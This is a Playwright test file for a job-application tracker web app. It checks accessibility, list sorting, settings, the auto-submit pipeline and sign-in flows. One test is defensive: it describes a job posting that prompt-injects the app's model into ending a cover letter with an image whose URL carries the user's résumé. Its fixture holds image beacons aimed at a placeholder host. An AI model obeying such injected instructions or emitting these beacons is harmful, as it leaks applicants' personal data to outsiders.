// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Aaron K. Clark
import { test, expect } from "@playwright/test";
import AxeBuilder from "@axe-core/playwright";

const application = {
  filename: "example-co-senior-engineer.md",
  company: "Example Co",
  role: "Senior Engineer",
  lane: "dotnet",
  status: "lead",
  location: "Remote",
  score: "62",
  created: "2026-04-02",
  snippet: "Build accessible software.",
};

// Two more rows so every sidebar ordering produces a visibly different sequence:
// fit score, posted date, company name, and the default pipeline order all disagree.
// Listed in the order the API returns them (status order, then company).
const applications = [
  application,
  {
    filename: "meridian-labs-platform-engineer.md",
    company: "Meridian Labs",
    role: "Platform Engineer",
    lane: "ai",
    status: "lead",
    score: "87",
    created: "2026-01-05",
    snippet: "",
  },
  {
    filename: "aurora-systems-developer-advocate.md",
    company: "Aurora Systems",
    role: "Developer Advocate",
    lane: "devrel",
    status: "applied",
    score: "",
    created: "2026-03-01",
    snippet: "",
  },
];

const detail = {
  filename: application.filename,
  raw: "# Example Co\n",
  version: "1",
  material: "",
  fields: {
    ...application,
    link: "https://example.com/jobs/1",
    salary: "$120,000",
    source: "Example careers",
    contact: "",
    contact_email: "",
    applied: "",
    followup: "",
    notes: "## Role notes\nBuild accessible software.",
  },
};

// The already-applied row from the list above, plus the detail the sheet renders for it.
const appliedApp = applications[2];
const appliedDetail = {
  filename: appliedApp.filename,
  raw: "# Aurora Systems\n",
  version: "1",
  material: "",
  fields: {
    ...appliedApp,
    link: "https://example.com/jobs/2",
    salary: "", source: "Example careers", contact: "", contact_email: "",
    applied: "2026-03-01", followup: "2026-03-08", notes: "Applied already.",
  },
};

// The submit queue as GET /api/pipeline reports it: one real click, one dry run parked
// on a security code, and a clean Ready packet waiting on the dry-run switch.
const pipeline = {
  allowed: true, enabled: true, dry_run: true, long_tail: false,
  worker_running: true, worker_last_seen: "2026-09-13T21:00:00Z", browser_available: true,
  queue: [
    { position: 1, name: application.filename, company: application.company, role: application.role, status: "ready",
      link: "https://boards.greenhouse.io/example/jobs/1", provider: "greenhouse", requested_at: "2026-09-13T20:58:00Z",
      claimed_at: "2026-09-13T20:59:00Z", phase: "awaiting_code", code_received: false, will: "submit", then_submit: false,
      reason: "", blocking_review: 0, last_evidence: "awaiting_code", last_evidence_at: "2026-09-13T20:59:30Z" },
    { position: 2, name: applications[1].filename, company: applications[1].company, role: applications[1].role, status: "ready",
      link: "https://jobs.lever.co/meridian/1", provider: "lever", requested_at: "2026-09-13T21:00:00Z",
      claimed_at: null, phase: "queued", code_received: false, will: "dry_run", then_submit: false,
      reason: "Dry run only is on in Settings · Agent", blocking_review: 0, last_evidence: "", last_evidence_at: null },
  ],
  ready: [
    { name: appliedApp.filename, company: appliedApp.company, role: appliedApp.role, link: "https://example.com/jobs/2",
      provider: "unknown", last_evidence: "dry_run", clean: true, promotable: true, blocking_review: 0,
      holding: "clean dry run; waiting for Dry run only to be turned off" },
  ],
  summary: { queued: 2, will_submit: 1, dry_runs: 1, prepares: 0, drops: 0, awaiting_code: 1, promotable: 1 },
};

// GET /api/analytics (#353): four applied, three heard back, from two sources and lanes.
const analytics = {
  since: null, applied: 4, responded: 3, rejected: 1, response_rate: 0.75, median_days_to_response: 6,
  funnel: [{ stage: "applied", count: 4 }, { stage: "screen", count: 2 }, { stage: "onsite", count: 1 }, { stage: "offer", count: 1 }],
  by_source: [
    { key: "LinkedIn", applied: 3, responded: 3, response_rate: 1, median_days_to_response: 4 },
    { key: "", applied: 1, responded: 0, response_rate: 0, median_days_to_response: null },
  ],
  by_lane: [
    { key: "dotnet", applied: 3, responded: 2, response_rate: 0.6667, median_days_to_response: 6 },
    { key: "ai", applied: 1, responded: 1, response_rate: 1, median_days_to_response: 2 },
  ],
};

const history = [
  { kind: "status", from_status: null, to_status: "lead", at: "2026-09-01T12:00:00Z" },
  { kind: "status", from_status: "lead", to_status: "applied", at: "2026-09-03T12:00:00Z" },
];

// GET /api/poll/status (#359): the poller last ran 12 minutes ago, and two of the
// account's sources failed on it.
const pollStatus = () => ({
  last_polled_at: new Date(Date.now() - 12 * 60000).toISOString(),
  last_leads_added: 3,
  failing: [
    { source: "remoteok", error: "ConnectError: connection refused" },
    { source: "greenhouse:acme", error: "HTTPStatusError: Client error '404 Not Found'" },
  ],
});

async function mockApi(page) {
  // The header's version badge reads /health, which is outside the /api/ prefix.
  await page.route("**/health", async (route) => {
    await route.fulfill({
      status: 200, contentType: "application/json",
      body: JSON.stringify({ status: "ok", version: "9.9.9" }),
    });
  });
  await page.route("**/api/**", async (route) => {
    const request = route.request();
    const path = new URL(request.url()).pathname;
    const method = request.method();
    let body = {};
    if (path === "/api/auth/me") body = { email: "person@example.com" };
    else if (path === "/api/llm-settings") body = {
      cover_letters_enabled: true, cover_letter_signature: "", secrets_available: true, has_api_key: false,
      base_url: "", model: "", instance: { base_url: "", model: "", has_api_key: false },
    };
    else if (path === "/api/apps" && method === "GET") {
      if (request.headers()["if-none-match"] === '"apps-1"') {
        await route.fulfill({ status: 304, headers: { ETag: '"apps-1"' } });
        return;
      }
      body = applications;
    }
    else if (path === "/api/errors" && method === "GET") {
      if (request.headers()["if-none-match"] === '"errors-1"') {
        await route.fulfill({ status: 304, headers: { ETag: '"errors-1"' } });
        return;
      }
      body = { count: 0, retrying: 0, needs_you: 0, errors: [] };
    }
    else if (path === "/api/stats") body = { status: { lead: 2, applied: 1 }, lane: { dotnet: 1, ai: 1, devrel: 1 } };
    else if (path === `/api/apps/${application.filename}` && method === "GET") body = detail;
    else if (path === `/api/apps/${appliedApp.filename}` && method === "GET") body = appliedDetail;
    else if (path === "/api/criteria") body = {
      keywords: ["engineer"], default_lane: "dotnet", min_fit_score: 55,
      remote_only: true, exclude_locations: [], sources: {}, ats_boards: [], rss_feeds: [],
    };
    else if (path === "/api/resume") body = {
      full_name: "", location: "", headline: "", summary: "",
      experience: [], skills: [], certifications: [], links: [],
    };
    else if (path === "/api/blacklist") body = [];
    else if (path === "/api/account/sessions" && method === "GET") body = [
      { id: "a".repeat(64), created_at: "2026-09-20T12:00:00Z", last_seen_at: "2026-09-25T12:00:00Z",
        expires_at: "2026-10-25T12:00:00Z", user_agent: "Firefox on Linux", current: true },
      { id: "b".repeat(64), created_at: "2026-09-01T12:00:00Z", last_seen_at: "2026-09-02T12:00:00Z",
        expires_at: "2026-10-02T12:00:00Z", user_agent: "Safari on iPhone", current: false },
    ];
    else if (path === "/api/account/sessions" && method === "DELETE") body = { revoked: 1 };
    else if (path === "/api/account/tokens" && method === "GET") body = [
      { id: 7, name: "Laptop CLI", scope: "read", created_at: "2026-09-20T12:00:00Z", last_used_at: null },
    ];
  else if (path === "/api/answers") body = [
    { key: "salary requirements", label: "Salary Requirements", help: "", type: "text", options: [], answer: "125000", source: "agent",
      first_application: "acme-engineer.md", times_seen: 3, first_seen_at: "2026-09-10T12:00:00Z", last_seen_at: "2026-09-13T12:00:00Z", updated_at: "2026-09-13T12:00:00Z" },
    { key: "are you legally authorized to work in the united states", label: "Are you legally authorized to work in the United States?", help: "", type: "select", options: ["Yes", "No"], answer: "Yes", source: "human",
      first_application: "acme-engineer.md", times_seen: 1, first_seen_at: "2026-09-10T12:00:00Z", last_seen_at: "2026-09-10T12:00:00Z", updated_at: "2026-09-10T12:00:00Z" },
  ];
    else if (path === "/api/agent-settings") body = {
      enabled: false, dry_run: true, min_fit_score: 70, max_per_run: 5, max_per_day: 20,
      work_authorization: "", needs_sponsorship: false, clearance_ok: false,
      salary_expectation: "", phone: "", worker_running: false,
    };
    else if (path === "/api/agent-events") body = [];
    else if (path === "/api/pipeline") body = pipeline;
    else if (path === "/api/analytics") body = analytics;
    else if (path.endsWith("/history")) body = history;
    else if (path.endsWith("/interviews") && method === "GET") body = [];
    else if (path.endsWith("/contacts") && method === "GET") body = [];
    else if (path.endsWith("/notes") && method === "GET") body = [];
    else if (path === "/api/due") body = { today: "2026-09-26", followups: [], interviews: [] };
    else if (path === "/api/notifications") body = {
      telegram_enabled: false, has_bot_token: false, telegram_chat_id: "", secrets_available: true,
      email_enabled: false, email_available: true, email_address: "ada@example.com",
      notify_packet_ready: true, notify_security_code: true, notify_submit_failed: true,
      digest_enabled: false, digest_insults: false, digest_hour: 12,
      notify_followup_due: true, reminder_hour: 12,
      calendar_feed_enabled: false, calendar_feed_created_at: null, calendar_feed_last_used_at: null,
    };
    else if (path.endsWith("/check-link")) body = { ok: true, summary: "Link is available." };
    else if (method === "POST" && path === "/api/poll") body = { count: 0 };
    else if (path === "/api/poll/status") body = pollStatus();
    else body = { ok: true, filename: application.filename, cover_letters_enabled: true, cover_letter_signature: "" };
    const headers = path === "/api/apps" && method === "GET"
      ? { ETag: '"apps-1"', "Cache-Control": "private, no-cache" }
      : path === "/api/errors" && method === "GET"
        ? { ETag: '"errors-1"', "Cache-Control": "private, no-cache" }
        : {};
    await route.fulfill({
      status: 200, contentType: "application/json",
      headers, body: JSON.stringify(body),
    });
  });
}

async function expectNoSeriousViolations(page) {
  const results = await new AxeBuilder({ page }).analyze();
  expect(results.violations.filter((item) => ["serious", "critical"].includes(item.impact))).toEqual([]);
}

async function openSettings(page) {
  await page.locator("#settings-btn:visible, #m-settings:visible").click();
}

test.beforeEach(async ({ page }) => {
  await mockApi(page);
  await page.goto("/");
  // The public-beta terms gate every signed-in session before the app renders, so every
  // other test has to get past them first.
  await page.getByRole("button", { name: "I understand and accept" }).click();
  await expect(page.getByRole("heading", { name: "Applications" })).toBeVisible();
});

test("dashboard, detail, editor, and preferences pass axe", async ({ page }) => {
  await expectNoSeriousViolations(page);

  await page.getByRole("button", { name: /Example Co/ }).click();
  await expect(page.getByRole("heading", { name: "Example Co" })).toBeFocused();
  await expectNoSeriousViolations(page);
  if (process.env.UPDATE_DOCS) {
    const path = test.info().project.name === "mobile" ? "docs/mobile.png" : "docs/screenshot.png";
    await page.screenshot({ path, fullPage: false });
  }

  await page.getByRole("tab", { name: "Form" }).click();
  await expect(page.getByRole("heading", { name: /Editing/ })).toBeFocused();
  await expectNoSeriousViolations(page);

  await openSettings(page);
  await expect(page.getByRole("heading", { name: "Display and sensory preferences" })).toBeFocused();
  await page.getByLabel("Text size").selectOption("150");
  await expect(page.locator("html")).toHaveAttribute("data-text-size", "150");
  const hasHorizontalOverflow = await page.evaluate(() => document.documentElement.scrollWidth > document.documentElement.clientWidth);
  expect(hasHorizontalOverflow).toBe(false);
  await expectNoSeriousViolations(page);
});

test("unchanged live refresh reuses the ETag without rerendering the list", async ({ page }) => {
  const originalCard = await page.getByRole("button", { name: /Example Co/ }).elementHandle();
  let statsRequests = 0;
  page.on("request", (request) => {
    if (new URL(request.url()).pathname === "/api/stats") statsRequests += 1;
  });
  const revalidation = page.waitForRequest((request) =>
    new URL(request.url()).pathname === "/api/apps"
      && request.headers()["if-none-match"] === '"apps-1"');
  // The Errors view's list is asked for on every tick too, and conditionally (#349): an
  // unchanged view is a 304, not the heavy per-row query.
  const errorsRevalidation = page.waitForRequest((request) =>
    new URL(request.url()).pathname === "/api/errors"
      && request.headers()["if-none-match"] === '"errors-1"');

  // Returning to a visible tab triggers the same live-refresh path immediately.
  await page.evaluate(() => document.dispatchEvent(new Event("visibilitychange")));
  await revalidation;
  await errorsRevalidation;
  await page.waitForTimeout(50);

  expect(await originalCard.evaluate((element) => element.isConnected)).toBe(true);
  expect(statsRequests).toBe(0);
});

// The sidebar list order, top to bottom.
const sidebarCompanies = (page) => page.locator("#app-list .ic-title").allTextContents();

test("the sidebar sorts by fit, date posted, and company name", async ({ page }) => {
  const sort = page.getByLabel("Sort by");

  // Default: the pipeline order the API returns (still-open roles first).
  await expect(sort).toHaveValue("pipeline");
  expect(await sidebarCompanies(page)).toEqual(["Example Co", "Meridian Labs", "Aurora Systems"]);

  await sort.selectOption("score");
  // An unscored role sinks to the bottom rather than sorting as a zero.
  expect(await sidebarCompanies(page)).toEqual(["Meridian Labs", "Example Co", "Aurora Systems"]);

  await sort.selectOption("created");
  expect(await sidebarCompanies(page)).toEqual(["Example Co", "Aurora Systems", "Meridian Labs"]);
  // Date order is only legible if the date is on the card.
  await expect(page.locator("#app-list").getByText("Posted 2026-04-02")).toBeVisible();

  await sort.selectOption("company");
  expect(await sidebarCompanies(page)).toEqual(["Aurora Systems", "Example Co", "Meridian Labs"]);

  await expectNoSeriousViolations(page);
});

test("the chosen sort survives a reload", async ({ page }) => {
  await page.getByLabel("Sort by").selectOption("company");
  await page.reload();
  await expect(page.getByRole("heading", { name: "Applications" })).toBeVisible();
  await expect(page.getByLabel("Sort by")).toHaveValue("company");
  expect(await sidebarCompanies(page)).toEqual(["Aurora Systems", "Example Co", "Meridian Labs"]);
});

test("sorting and filtering compose", async ({ page }) => {
  await page.getByLabel("Sort by").selectOption("company");
  await page.locator("#filter-status").selectOption("lead");
  expect(await sidebarCompanies(page)).toEqual(["Example Co", "Meridian Labs"]);
  await expect(page.locator("#app-count")).toHaveText("2 of 3 applications");
});

test("criteria settings add and remove custom RSS feeds", async ({ page }) => {
  const saved = page.waitForRequest((request) =>
    new URL(request.url()).pathname === "/api/criteria" && request.method() === "PUT");

  await openSettings(page);
  await page.getByRole("tab", { name: "Criteria", exact: true }).click();
  await expect(page.locator("#criteria-feeds")).toContainText("No custom feeds added.");

  // A URL the poller could never fetch is refused before it reaches the server.
  await page.getByLabel("Feed URL").fill("ftp://example.com/feed");
  await page.getByRole("button", { name: "+ Add feed" }).click();
  await expect(page.locator("#toast")).toContainText("http://");
  await expect(page.locator("#criteria-feeds")).toContainText("No custom feeds added.");

  await page.getByLabel("Feed URL").fill("https://hooli.example/careers.rss");
  await page.getByRole("button", { name: "+ Add feed" }).click();
  await expect(page.locator("#criteria-feeds")).toContainText("https://hooli.example/careers.rss");
  await expectNoSeriousViolations(page);

  await page.getByRole("button", { name: "Save criteria" }).click();
  expect((await saved).postDataJSON().rss_feeds).toEqual(["https://hooli.example/careers.rss"]);

  await page.getByRole("button", { name: /Remove feed/ }).click();
  await expect(page.locator("#criteria-feeds")).toContainText("No custom feeds added.");
});

test("settings sections expose labeled controls", async ({ page }) => {
  await openSettings(page);
  for (const tab of ["Criteria", "Résumé", "AI", "Agent", "Answers", "Notifications", "Blacklist", "Account"]) {
    await page.getByRole("tab", { name: tab, exact: true }).click();
    await expect(page.getByRole("tabpanel")).not.toBeEmpty();
    await expectNoSeriousViolations(page);
  }
});

test("a ready packet lists its answers, blocks submit on review items, and passes axe", async ({ page }) => {
  const readyDetail = {
    ...detail,
    fields: { ...detail.fields, status: "ready" },
    agent_verdict: { detail: { decision: "proceed", confidence: 88, rationale: "Core requirements met.", concerns: ["confirm on-call"] }, created_at: "2026-09-06T12:00:00Z" },
    packet: {
      application_name: application.filename, provider: "greenhouse", posting_excerpt: "We build accessible software.",
      version: 3, model: "stub",
      questions: [
        { id: "first_name", label: "First Name", required: true, type: "text", options: [], kind: "standard" },
        { id: "question_2", label: "Are you legally authorized to work in the US?", required: true, type: "select", options: ["Yes", "No"], kind: "custom" },
        { id: "question_3", label: "Describe a system you scaled.", required: true, type: "textarea", options: [], kind: "custom" },
        { id: "resume", label: "Resume/CV", required: true, type: "file", options: [], kind: "standard" },
        { id: "gender", label: "Gender", required: false, type: "select", options: ["Decline"], kind: "eeo" },
      ],
      answers: { first_name: "Ada", question_2: "Yes" },
      needs_review: [{ id: "question_3", reason: "the model could not answer this from your résumé" }],
    },
  };
  await page.unroute("**/api/**");
  await page.route("**/api/**", async (route) => {
    const path = new URL(route.request().url()).pathname;
    const method = route.request().method();
    let body = { ok: true };
    if (path === "/api/auth/me") body = { email: "person@example.com" };
    else if (path === "/api/apps" && method === "GET") body = applications;
    else if (path === "/api/stats") body = { status: { ready: 1, lead: 1, applied: 1 }, lane: {} };
    else if (path === `/api/apps/${application.filename}` && method === "GET") body = readyDetail;
    else if (path === "/api/agent-settings") body = { enabled: true, worker_running: true, browser_available: true };
    else if (path === "/api/llm-settings") body = { cover_letters_enabled: true };
    else if (path.endsWith("/evidence")) body = [
      { id: 7, kind: "dry_run", url: "https://example.com/jobs/1", confirmation: "", detail: { mapped: ["first_name"] }, has_screenshot: false, created_at: "2026-09-06T12:05:00Z" },
    ];
    else if (path.endsWith("/submit") && method === "POST") body = { queued: true, dry_run: true, pending: true };
    else if (path.endsWith("/packet") && method === "PUT") body = { ...readyDetail.packet, version: 4, needs_review: [] };
    await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify(body) });
  });
  await page.goto("/");
  await page.getByRole("button", { name: /Example Co/ }).first().click();
  await expect(page.getByRole("heading", { name: "Application packet" })).toBeVisible();
  await expect(page.getByRole("alert").filter({ hasText: "need" })).toContainText("Describe a system you scaled.");
  await expect(page.getByLabel("First Name *")).toHaveValue("Ada");
  await expect(page.getByLabel("Are you legally authorized to work in the US? *")).toHaveValue("Yes");
  await expect(page.getByText("never guessed")).toBeVisible();
  await expect(page.getByRole("heading", { name: "Fit verdict" })).toBeVisible();
  // A browser is available: Submit stays disabled while answers need review; the dry
  // run is always offered; the last dry run shows as evidence.
  await expect(page.getByRole("button", { name: "Submit application" })).toBeDisabled();
  await expect(page.getByRole("button", { name: "Fill in the browser (dry run)" })).toBeEnabled();
  await expect(page.getByText("Filled (dry run)")).toBeVisible();
  await expectNoSeriousViolations(page);

  const saved = page.waitForRequest((request) =>
    new URL(request.url()).pathname.endsWith("/packet") && request.method() === "PUT");
  await page.getByLabel("Describe a system you scaled. *").fill("I scaled the billing service.");
  await page.getByRole("button", { name: "Save answers" }).click();
  const req = await saved;
  expect(new URL(req.url()).searchParams.get("expected_version")).toBe("3");
  expect(req.postDataJSON().answers.question_3).toBe("I scaled the billing service.");
});

test("notifications offer email beside Telegram, with per-event toggles that save (#355)", async ({ page }) => {
  let saved = null;
  page.on("request", (r) => {
    if (r.method() === "PUT" && new URL(r.url()).pathname === "/api/notifications") saved = r.postDataJSON();
  });
  await openSettings(page);
  await page.getByRole("tab", { name: "Notifications", exact: true }).click();
  const events = page.getByRole("group", { name: "What to hear about" });
  await expect(events.getByRole("checkbox")).toHaveCount(4);
  await expect(page.getByText("ada@example.com")).toBeVisible();
  await expectNoSeriousViolations(page);

  await page.getByRole("checkbox", { name: "Send me an email" }).check();
  await events.getByRole("checkbox", { name: "A submission did not go through" }).uncheck();
  await page.getByRole("button", { name: "Save notifications" }).click();
  await expect.poll(() => saved).not.toBeNull();
  expect(saved.email_enabled).toBe(true);
  expect(saved.notify_submit_failed).toBe(false);
  expect(saved.notify_packet_ready).toBe(true);
});

test("the daily digest is off by default and saves its switch, insults and hour (#336)", async ({ page }) => {
  let saved = null;
  page.on("request", (r) => {
    if (r.method() === "PUT" && new URL(r.url()).pathname === "/api/notifications") saved = r.postDataJSON();
  });
  await openSettings(page);
  await page.getByRole("tab", { name: "Notifications", exact: true }).click();
  const digest = page.getByRole("group", { name: "Daily digest" });
  await expect(digest.getByRole("checkbox", { name: "Email me the daily digest" })).not.toBeChecked();
  await expect(digest.getByRole("checkbox", { name: "Insult me" })).not.toBeChecked();
  await expect(digest.getByRole("combobox", { name: "Send it at" })).toHaveValue("12");
  await expectNoSeriousViolations(page);

  await digest.getByRole("checkbox", { name: "Email me the daily digest" }).check();
  await digest.getByRole("checkbox", { name: "Insult me" }).check();
  await digest.getByRole("combobox", { name: "Send it at" }).selectOption("7");
  await page.getByRole("button", { name: "Save notifications" }).click();
  await expect.poll(() => saved).not.toBeNull();
  expect(saved.digest_enabled).toBe(true);
  expect(saved.digest_insults).toBe(true);
  expect(saved.digest_hour).toBe(7);
});

test("resume settings use PDF upload instead of manual fields", async ({ page }) => {
  await openSettings(page);
  await page.getByRole("tab", { name: "Résumé", exact: true }).click();
  await expect(page.getByLabel("Résumé PDF file")).toBeVisible();
  await expect(page.getByRole("button", { name: "Upload PDF" })).toBeVisible();
  await expect(page.getByLabel("Full name")).toHaveCount(0);
  await expect(page.getByLabel("Headline")).toHaveCount(0);
  await expect(page.getByLabel("Summary")).toHaveCount(0);
  await expect(page.getByRole("button", { name: "Save résumé" })).toHaveCount(0);
});

test("keyboard navigation and validation retain visible focus", async ({ page }) => {
  await page.keyboard.press("/");
  await expect(page.getByLabel("Search applications")).toBeFocused();
  await page.keyboard.press("Escape");
  await page.keyboard.press("n");
  // Role-qualified: the sort select's label text also contains "Company".
  await expect(page.getByRole("textbox", { name: /Company/ })).toBeFocused();
  await page.getByRole("button", { name: "Create" }).click();
  await expect(page.locator("#form-errors")).toContainText("Enter a company");
});

test("a populated mobile list scrolls to its last card inside the shell", async ({ page }, testInfo) => {
  test.skip(testInfo.project.name !== "mobile", "Mobile single-column layout");
  // On a phone nothing between the fixed-height shell and the list was a scroll
  // container, so the list was clipped and the swipe fell through to a document that
  // cannot scroll — which Safari reads as pull-to-refresh (#201).
  await expect(page.locator("#app-list .application-card").first()).toBeVisible();
  await page.evaluate(() => {
    const list = document.querySelector("#app-list");
    const row = list.firstElementChild;
    for (let index = 0; index < 12; index += 1) list.append(row.cloneNode(true));
  });
  const last = page.locator("#app-list .application-card").last();
  // A gesture, not scrollIntoView: script can scroll an overflow-hidden box, a finger cannot.
  // On a phone the workspace is the scroller, list tools and all, and the list's first row
  // starts near the fold, under the fixed action bar — so the swipe starts on the list
  // tools, where a thumb would, not on a row the bar covers.
  const box = await page.locator(".list-tools").boundingBox();
  await page.mouse.move(box.x + box.width / 2, box.y + 10);
  await page.mouse.wheel(0, 4000);
  await expect(last).toBeInViewport();
  // The shell itself did not move: the header stays put and the document is not the scroller.
  await expect(page.locator(".app-header")).toBeInViewport();
  expect(await page.evaluate(() => window.scrollY)).toBe(0);
});

test("a populated desktop list scrolls without moving the application shell", async ({ page }, testInfo) => {
  test.skip(testInfo.project.name !== "desktop", "Desktop master-detail layout");
  // The heading is static; the rows arrive after the boot fetches. Wait for one.
  await expect(page.locator("#app-list .application-card").first()).toBeVisible();
  await page.evaluate(() => {
    const list = document.querySelector("#app-list");
    const row = list.firstElementChild;
    for (let index = 0; index < 12; index += 1) list.append(row.cloneNode(true));
  });
  await page.locator("#app-list").evaluate((list) => { list.scrollTop = list.scrollHeight; });
  await page.locator("#content").evaluate((content) => {
    content.innerHTML = '<div style="height: 1600px">Tall application detail fixture</div>';
  });
  const geometry = await page.evaluate(() => {
    const workspace = document.querySelector("#workspace").getBoundingClientRect();
    const content = document.querySelector("#content").getBoundingClientRect();
    return { workspaceTop: workspace.top, workspaceBottom: workspace.bottom, contentTop: content.top, contentBottom: content.bottom };
  });
  expect(await page.evaluate(() => window.scrollY)).toBe(0);
  expect(Math.abs(geometry.contentTop - geometry.workspaceTop)).toBeLessThan(1);
  expect(geometry.contentBottom).toBeLessThanOrEqual(geometry.workspaceBottom + 1);
  await expect(page.locator(".app-header")).toBeVisible();
  await expect(page.locator("#content")).toBeInViewport();
});

test("mobile detail navigation hides only the inactive pane", async ({ page }, testInfo) => {
  test.skip(testInfo.project.name !== "mobile", "Mobile-specific navigation");
  await page.getByRole("button", { name: /Example Co/ }).click();
  await expect(page.getByRole("heading", { name: "Example Co" })).toBeVisible();
  await page.getByRole("button", { name: "Applications", exact: true }).click();
  await expect(page.getByRole("heading", { name: "Applications" })).toBeVisible();
  await expect(page.getByRole("button", { name: /Example Co/ })).toBeFocused();
});

test("dark and high-contrast visual modes retain accessible contrast", async ({ page }) => {
  await page.locator("html").evaluate((root) => { root.dataset.colorMode = "dark"; });
  await expectNoSeriousViolations(page);
  await page.locator("html").evaluate((root) => {
    root.dataset.colorMode = "light";
    root.dataset.contrast = "high";
  });
  await expectNoSeriousViolations(page);
});

test("narrow mobile forms and final actions stay clear of the action bar", async ({ page }, testInfo) => {
  test.skip(testInfo.project.name !== "mobile", "Mobile-specific geometry");
  await page.setViewportSize({ width: 320, height: 760 });
  expect(await page.evaluate(
    () => document.documentElement.scrollWidth <= document.documentElement.clientWidth,
  )).toBe(true);

  await page.getByRole("button", { name: /Example Co/ }).click();
  const deleteButton = page.getByRole("button", { name: "Delete", exact: true });
  await deleteButton.scrollIntoViewIfNeeded();
  const actionGeometry = await page.evaluate(() => {
    const button = document.querySelector('[data-act="delete"]').getBoundingClientRect();
    const nav = document.querySelector(".mobile-actions").getBoundingClientRect();
    return { buttonBottom: button.bottom, navTop: nav.top };
  });
  expect(actionGeometry.buttonBottom).toBeLessThanOrEqual(actionGeometry.navTop);

  await page.getByRole("button", { name: "New", exact: true }).click();
  const formGeometry = await page.evaluate(() => {
    const lane = document.querySelector("#f-lane").getBoundingClientRect();
    const status = document.querySelector("#f-status").getBoundingClientRect();
    return { laneBottom: lane.bottom, statusTop: status.top, laneLeft: lane.left, statusLeft: status.left };
  });
  expect(formGeometry.statusTop).toBeGreaterThan(formGeometry.laneBottom);
  expect(Math.abs(formGeometry.laneLeft - formGeometry.statusLeft)).toBeLessThan(1);
});

test("magic-link login is labeled and announced", async ({ page }) => {
  await page.unroute("**/api/**");
  await page.route("**/api/**", async (route) => {
    const path = new URL(route.request().url()).pathname;
    if (path === "/api/auth/me") {
      await route.fulfill({ status: 401, contentType: "application/json", body: '{"detail":"Sign in required"}' });
    } else {
      await route.fulfill({ status: 200, contentType: "application/json", body: '{"ok":true}' });
    }
  });
  await page.reload();
  await expect(page.getByRole("heading", { name: "ApplyTrack" })).toBeVisible();
  await expect(page.getByLabel("Email address")).toBeFocused();
  await expectNoSeriousViolations(page);
});

test("a link opened in the wrong browser says which browser to use", async ({ page }) => {
  // #341: the server redirects here when the link was requested from another browser.
  await page.unroute("**/api/**");
  await page.route("**/api/**", async (route) => {
    const path = new URL(route.request().url()).pathname;
    if (path === "/api/auth/me") {
      await route.fulfill({ status: 401, contentType: "application/json", body: '{"detail":"Sign in required"}' });
    } else {
      await route.fulfill({ status: 200, contentType: "application/json", body: '{"ok":true}' });
    }
  });
  await page.goto("/?error=wrong_browser");
  await expect(page.locator(".login-error")).toContainText("same browser you requested it from");
  await expectNoSeriousViolations(page);
});

test("a prompt-injected image in a draft or notes fetches nothing (#342)", async ({ page }) => {
  // The posting told the model to end the letter with an image whose URL carries the
  // résumé. Showing the letter must not make the browser request it — and the same goes
  // for notes, which the poller copies from the posting.
  const beacons = [];
  await page.route("**://example.invalid/**", (route) => {
    beacons.push(route.request().url());
    return route.abort();
  });
  await page.route(`**/api/apps/${application.filename}`, (route) => route.fulfill({
    status: 200, contentType: "application/json",
    body: JSON.stringify({
      ...detail,
      material: "Dear Hiring Team,\n\nI build things.\n\n![](https://example.invalid/x?d=Ada)"
        + ' <img src="https://example.invalid/raw">',
      fields: { ...detail.fields, notes: "Notes ![logo](https://example.invalid/notes.png)" },
    }),
  }));

  await page.getByRole("button", { name: /Example Co/ }).click();
  await expect(page.locator(".material-body")).toContainText("I build things.");
  await expect(page.locator(".prose-omi img")).toHaveCount(0);
  await page.waitForLoadState("networkidle");
  expect(beacons).toEqual([]);
});

test("the header shows the running build version", async ({ page }) => {
  // A version on screen must be one the server confirmed, so the badge stays hidden
  // until /health answers — never a guess and never an empty chip.
  const badge = page.locator("#app-version");
  await expect(badge).toBeVisible();
  await expect(badge).toHaveText("v9.9.9");
});

test("Mark applied is disabled once a role is already applied", async ({ page }) => {
  // Opened from a fresh list each time: on the mobile layout the detail pane replaces
  // the list, so the second row is not clickable without going back.
  await page.getByRole("button", { name: /Aurora Systems/ }).click();
  const done = page.getByRole("button", { name: "Mark applied" });
  await expect(done).toBeDisabled();
  await expect(done).toHaveAttribute("title", /Already applied/);
  await expectNoSeriousViolations(page);

  await page.reload();
  await page.getByRole("button", { name: /Example Co/ }).click();
  await expect(page.getByRole("button", { name: "Mark applied" })).toBeEnabled();
});

test("the public beta terms gate every session and cannot be dismissed unread", async ({ page }) => {
  // beforeEach already accepted them, so clear the session marker and reload to see a
  // fresh sign-in.
  await page.evaluate(() => sessionStorage.clear());
  await page.reload();

  const dialog = page.getByRole("dialog", { name: "Public beta — please read" });
  await expect(dialog).toBeVisible();
  await expect(dialog).toContainText("No guarantees of confidentiality, availability, or integrity");
  await expect(dialog).toContainText("No routine backups are performed");
  await expect(dialog).toContainText("release CryptoJones (Aaron Clark) from any and all liabilities");
  // None of their data has been fetched or drawn yet — the terms come first.
  await expect(page.getByRole("button", { name: /Example Co/ })).toHaveCount(0);
  // Escape is refused: acknowledging is the only way through.
  await page.keyboard.press("Escape");
  await expect(dialog).toBeVisible();
  await expectNoSeriousViolations(page);

  await page.getByRole("button", { name: "I understand and accept" }).click();
  await expect(dialog).not.toBeVisible();
  await expect(page.getByRole("heading", { name: "Applications" })).toBeVisible();

  // Acknowledged for this session only — a reload in the same tab does not re-prompt.
  await page.reload();
  await expect(page.getByRole("heading", { name: "Applications" })).toBeVisible();
  await expect(page.getByRole("dialog", { name: "Public beta — please read" })).not.toBeVisible();
});

test("sign-in requires accepting the terms, which are readable from the form", async ({ page }) => {
  await page.unroute("**/api/**");
  await page.route("**/api/**", async (route) => {
    const path = new URL(route.request().url()).pathname;
    if (path === "/api/auth/me") {
      await route.fulfill({ status: 401, contentType: "application/json", body: '{"detail":"Sign in required"}' });
    } else {
      await route.fulfill({ status: 200, contentType: "application/json", body: '{"ok":true}' });
    }
  });
  await page.reload();

  const send = page.getByRole("button", { name: "Send magic link" });
  const accept = page.getByLabel(/I accept the/);
  await expect(send).toBeDisabled();

  // The terms themselves have to be reachable before you agree to them.
  await page.getByRole("button", { name: "Terms of Service" }).click();
  const dialog = page.getByRole("dialog", { name: "Public beta — please read" });
  await expect(dialog).toBeVisible();
  await expect(dialog).toContainText("release CryptoJones (Aaron Clark) from any and all liabilities");
  await expectNoSeriousViolations(page);
  await page.getByRole("button", { name: "Close" }).click();
  await expect(dialog).not.toBeVisible();

  await accept.check();
  await expect(send).toBeEnabled();
  await accept.uncheck();
  await expect(send).toBeDisabled();
});

